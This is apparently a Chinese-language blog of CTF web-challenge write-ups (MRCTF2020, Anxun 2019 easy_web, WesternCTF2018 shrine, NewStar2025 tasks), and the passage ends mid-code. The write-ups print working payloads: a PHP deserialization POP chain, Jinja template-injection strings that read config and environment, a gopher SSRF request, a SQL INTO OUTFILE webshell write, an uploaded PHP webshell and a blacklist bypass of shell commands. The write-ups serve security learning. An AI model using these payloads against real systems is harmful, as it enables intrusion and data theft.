<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">	<span class="keyword">protected</span>  <span class="variable">$var</span>=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;source = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;source-&gt;str = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;source-&gt;str-&gt;p = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pop=O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D</span><br></pre></td></tr></table></figure>

<p><img src="https://bucketqiao123456.oss-cn-beijing.aliyuncs.com/image-20251129231515722.png" alt="image-20251129231515722"></p>
<p>base64解码得到FLAG</p>
<h1 id="3-MRCTF2020-PYWebsite-【IP-信任漏洞】"><a href="#3-MRCTF2020-PYWebsite-【IP-信任漏洞】" class="headerlink" title="3.[MRCTF2020]PYWebsite  【IP 信任漏洞】"></a>3.[MRCTF2020]PYWebsite  【IP 信任漏洞】</h1><p>其实就是把x-forward-for改成127.0.0.1（）</p>
<p><img src="https://bucketqiao123456.oss-cn-beijing.aliyuncs.com/image-20251129232204747.png" alt="image-20251129232203925"></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">enc</span>(<span class="params">code</span>)&#123;</span><br><span class="line">      hash = <span class="title function_">hex_md5</span>(code);</span><br><span class="line">      <span class="keyword">return</span> hash;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">validate</span>(<span class="params"></span>)&#123;</span><br><span class="line">      <span class="keyword">var</span> code = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;vcode&quot;</span>).<span class="property">value</span>;</span><br><span class="line">      <span class="keyword">if</span> (code != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_">hex_md5</span>(code) == <span class="string">&quot;0cd4da0223c0b280829dc3ea458d655c&quot;</span>)&#123;</span><br><span class="line">          <span class="title function_">alert</span>(<span class="string">&quot;您通过了验证！&quot;</span>);</span><br><span class="line">          <span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&quot;./flag.php&quot;</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="title function_">alert</span>(<span class="string">&quot;你的授权码不正确！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;请输入授权码&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>直接访问，意料之中不行</p>
<p><img src="https://bucketqiao123456.oss-cn-beijing.aliyuncs.com/image-20251129232301573.png" alt="image-20251129232301573"></p>
<p>“除了购买者和我”看出来应该是请求本地访问，改x-forward-for：127.0.0.1</p>
<p><img src="https://bucketqiao123456.oss-cn-beijing.aliyuncs.com/image-20251129232407046.png" alt="image-20251129232407046"></p>
<p>成功</p>
<h1 id="4-安洵杯-2019-easy-web"><a href="#4-安洵杯-2019-easy-web" class="headerlink" title="4.[安洵杯 2019]easy_web"></a>4.[安洵杯 2019]easy_web</h1><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://bucketqiao123456.oss-cn-beijing.aliyuncs.com/image-20251129232730810.png" alt="image-20251129232730810"></h2><p>看到url里面<a target="_blank" rel="noopener" href="http://5cefc48c-a491-4714-9471-ff016b33d1ea.node5.buuoj.cn:81/index.php?img=TmprMlJUWTBOalUzT0RKRk56QTJPRGN3&cmd=">http://5cefc48c-a491-4714-9471-ff016b33d1ea.node5.buuoj.cn:81/index.php?img=TmprMlJUWTBOalUzT0RKRk56QTJPRGN3&amp;cmd=</a></p>
<p>有img和cmd参数，试过之后发现img的参数是base64加密两次，然后hex解密一次</p>
<p>解出来是555.png，猜想这里是打开这个文件，改成index.php，TmprMlJUWTBOalUzT0RKRk56QTJPRGN3</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>md5强绕过和一些过滤</p>
<p>对于这里的正则</p>
<p>我们发现禁用了tac nl more less head tail cat od  等一些可以读取文件内容的关键字，注意看后面的|\|\\|，我们都知道在php中正则过滤反斜杠要写四个\字符，因为会经过两次解析，一次php解析器的解析，另一次是正则表达式的解析。</p>
<p>\\，先经过php的解析成\，再经过正则表达式的解析成\，但是前面又多了一个\，经过php的解析成\，|这个字符在正则中是保留字符，所以可以转义，再经过正则的解析时\会与后面的|一起解析成|，问题就出现在这一块，整个来看，先经过php的解析成||\|，再经过正则的解析成|||，所以最后匹配的是|\而不是\，所以我们可以用反斜杠绕过</p>
<p>cmd&#x3D;dir &#x2F; cmd&#x3D;ca\t</p>
<p><img src="https://bucketqiao123456.oss-cn-beijing.aliyuncs.com/image-20251129233214029.png" alt="image-20251129233214029"></p>
<p><img src="https://bucketqiao123456.oss-cn-beijing.aliyuncs.com/image-20251129233225018.png" alt="image-20251129233225018"></p>
<h1 id="6-WesternCTF2018-shrine"><a href="#6-WesternCTF2018-shrine" class="headerlink" title="6.[WesternCTF2018]shrine"></a>6.[WesternCTF2018]shrine</h1><p>开局给源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shrine</span>(<span class="params">shrine</span>):</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">safe_jinja</span>(<span class="params">s</span>):</span><br><span class="line">		s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">		blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line">	<span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>题目给出了Flask的源码，其中有一条<code>FLAG</code>的config，<br> 源码中有两个路由，其中还有<code>/shrine/</code>路径，简单测试后存在模版注入：<code>/shrine/&#123;&#123;2+2&#125;&#125;</code></p>
<p><img src="https://bucketqiao123456.oss-cn-beijing.aliyuncs.com/image-20251129233403858.png" alt="image-20251129233403858"></p>
<p>若不存在黑名单，可以使用读取，</p>
<p>Python的沙箱逃逸可以利用Python对象之间的引用关系来调用被禁用的函数对象，其中有两个函数包含了current_app<br>全局变量，也就是：url_for()和get_flashed_messages()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shrine/&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://bucketqiao123456.oss-cn-beijing.aliyuncs.com/image-20251129233503256.png" alt="image-20251129233503256"></p>
<p><img src="https://bucketqiao123456.oss-cn-beijing.aliyuncs.com/image-20251129233515563.png" alt="image-20251129233515563"></p>
<h1 id="7-NewStar2025-week3-小E的秘密计划"><a href="#7-NewStar2025-week3-小E的秘密计划" class="headerlink" title="7.NewStar2025-week3 小E的秘密计划"></a>7.NewStar2025-week3 小E的秘密计划</h1><p>提示备份文件，直接扫出来<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
<p><img src="https://bucketqiao123456.oss-cn-beijing.aliyuncs.com/image-20251130215911889.png" alt="image-20251130215911889"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;user.php&#x27;</span>;</span><br><span class="line"><span class="variable">$userData</span> = <span class="title function_ invoke__">getUserData</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> === <span class="variable">$userData</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$password</span> === <span class="variable">$userData</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /secret-xxxxxxxxxxxxxxxxxxx&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;登录失败,在git里找找吧&#x27;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>提示在git里面</p>
<p><img src="https://bucketqiao123456.oss-cn-beijing.aliyuncs.com/image-20251130221418486.png" alt="image-20251130221418486"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reflog show --all		</span><br></pre></td></tr></table></figure>

<p>记录所有引用的移动历史，即记录所有操作</p>
<p><img src="https://bucketqiao123456.oss-cn-beijing.aliyuncs.com/image-20251130221516574.png" alt="image-20251130221516574"></p>
<p>353b98分支被删了，直接看</p>
<p><img src="https://bucketqiao123456.oss-cn-beijing.aliyuncs.com/image-20251130221555765.png" alt="image-20251130221555765"></p>
<p>读到密码直接登</p>
<p><img src="https://bucketqiao123456.oss-cn-beijing.aliyuncs.com/image-20251130221633013.png" alt="image-20251130221633013"></p>
<p>mac的.DS_Store泄露，找到flag文件名，直接读flag</p>
<p><img src="https://bucketqiao123456.oss-cn-beijing.aliyuncs.com/image-20251130221725962.png" alt="image-20251130221725962"></p>
<p>成功</p>
<h1 id="8-NewStar2025-week3-mirror-gate"><a href="#8-NewStar2025-week3-mirror-gate" class="headerlink" title="8.NewStar2025-week3 mirror_gate"></a>8.NewStar2025-week3 mirror_gate</h1><p>第一次见到直接可以看到.htaccess的文件上传，特此记录一下</p>
<p>扫目录扫出来.htaccess</p>
<p><img src="https://bucketqiao123456.oss-cn-beijing.aliyuncs.com/image-20251130222002361.png" alt="image-20251130222002361"></p>
<p><img src="https://bucketqiao123456.oss-cn-beijing.aliyuncs.com/image-20251130222017476.png" alt="image-20251130222017476"></p>
<p>webp当php执行，然后就很常规了，短标签绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=show_source(&#x27;/flag.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<p>直接拿到flag</p>
<p><img src="https://bucketqiao123456.oss-cn-beijing.aliyuncs.com/image-20251130222138660.png" alt="image-20251130222138660"></p>
<h1 id="9-NewStar2025-week4-SSTI-在哪里？"><a href="#9-NewStar2025-week4-SSTI-在哪里？" class="headerlink" title="9.NewStar2025-week4 SSTI 在哪里？"></a>9.NewStar2025-week4 SSTI 在哪里？</h1><p>存在 ssrf.</p>
<p>file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd读到是 flask 服务</p>
<p>file:&#x2F;&#x2F;&#x2F;app&#x2F;app.py读源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask import Flask, request, render_template_string</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def <span class="title function_ invoke__">index</span>():</span><br><span class="line">    template = request.form.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;template&#x27;</span>, <span class="string">&#x27;Hello World!&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">render_template_string</span>(template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.<span class="title function_ invoke__">run</span>(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">5001</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将 name 接受的东西给到了 template，感觉有 SSTI</p>
<p>用 gopher 协议打，先认识一下gopher 协议</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gopher协议</span><br><span class="line">    概念：</span><br><span class="line">      1.gopher协议是一种信息查找系统，它将internet上的文件组织成某种索引，方便用户从internet的一处带到另一处。但在www出现后，gopher就失去了昔日的辉煌。</span><br><span class="line">      2.现在它已过时。它只支持文本，不支持图像。</span><br><span class="line">      3.gopher协议可以做很多事情，特别是在ssrf中可以发挥很多重要的作用，利用此协议可以攻击内网的FTP，Telnnet，Redis,Memcache,也可进行GET,POST请求</span><br><span class="line">      4.可以通过gopher协议将get请求伪装成post请求，他是SSRF利用中一个最强大的协议（俗称万能协议），可用于反弹shell</span><br><span class="line">    语法：gopher://127.0.0.1:80/_&#123;TCP/IP数据流&#125;</span><br><span class="line">    注意：</span><br><span class="line">      1.这里的_不能省略</span><br><span class="line">      2.这里的端口默认是70，但要具体情况具体而定，http就是80，https就是443</span><br><span class="line">      3.如果发起post请求，回车换行符就必须要使用%0D%0A,告诉计算机你已经执行完了。如果多个参数，参数之间的&amp;也需要进行URL编码</span><br><span class="line">    需要的条件：在构造的时候，只需要保留这几样必要的东西就行</span><br><span class="line">      gopher : //127.0.0.1:80/_POST /flag.php HTTP/1.1</span><br><span class="line">      Host : challenge-0cd16c73a7cf875a.sandbox.ctfhub.com:10800</span><br><span class="line">      Content-Type : application/x-www-form-urlencoded</span><br><span class="line">      Content-Length : 36</span><br></pre></td></tr></table></figure>

<p>Flag 在环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=gopher://127.0.0.1:5000/_GET%2520%252F%2520HTTP%252F1.1%250AHost%253A%2520127.0.0.1%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250AContent-Length%253A%252056%250A%250Aname%253D%257B%257Blipsum.__globals__%255B&#x27;os&#x27;%255D%255B&#x27;popen&#x27;%255D(&#x27;env&#x27;).read()%257D%257D</span><br></pre></td></tr></table></figure>

<p><img src="https://bucketqiao123456.oss-cn-beijing.aliyuncs.com/image-20251130223209913.png" alt="image-20251130223209913"></p>
<p>成功</p>
<h1 id="10-NewStar2025-week4-sqlupload"><a href="#10-NewStar2025-week4-sqlupload" class="headerlink" title="10.NewStar2025-week4 sqlupload"></a>10.NewStar2025-week4 sqlupload</h1><p>很新的知识点，在特定的位置注入你的恶意代码，然后想办法将其保存在可被执行的位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?order=upload_time INTO OUTFILE &#x27;/var/www/html/1.php&#x27;</span><br></pre></td></tr></table></figure>

<p>问题在 getFileList.php</p>
<p><img src="https://bucketqiao123456.oss-cn-beijing.aliyuncs.com/image-20251130225217389.png" alt="image-20251130225217389"></p>
<p>我们可以控制 order 参数将 filename 写入到文件</p>
<p>通过抓包传一个文件名是一句话木马的东西上去</p>
<p><img src="https://bucketqiao123456.oss-cn-beijing.aliyuncs.com/image-20251130225233805.png" alt="image-20251130225233805"></p>
<p>把它保存在1.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?order=upload_time INTO OUTFILE &#x27;/var/www/html/1.php&#x27;</span><br></pre></td></tr></table></figure>

<p>访问1.php，post传命令</p>
<p>但是直接读取 &#x2F;readFlag是读不了的</p>
<p><img src="https://bucketqiao123456.oss-cn-beijing.aliyuncs.com/image-20251130225409391.png" alt="image-20251130225409391"></p>
<p>重定向到2.txt，直接读2.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=system(&#x27;/readFlag&gt;2.txt&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src="https://bucketqiao123456.oss-cn-beijing.aliyuncs.com/image-20251130225801015.png" alt="image-20251130225801015"></p>
<p>拿到flag</p>
<h1 id="11-NewStar2025-week5-眼熟的计算器"><a href="#11-NewStar2025-week5-眼熟的计算器" class="headerlink" title="11.NewStar2025-week5 眼熟的计算器"></a>11.NewStar2025-week5 眼熟的计算器</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line">package org.example.newstar.controller;</span><br><span class="line"></span><br><span class="line">import javax.script.ScriptEngineManager;</span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.ui.Model;</span><br><span class="line">import org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"></span><br><span class="line">@Controller</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NewstarController</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String[] BLACKLIST = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;import&quot;</span>, <span class="string">&quot;java.lang.Runtime&quot;</span>, <span class="string">&quot;new&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_ invoke__">calculate</span>(String content) throws <span class="built_in">Exception</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(String word : 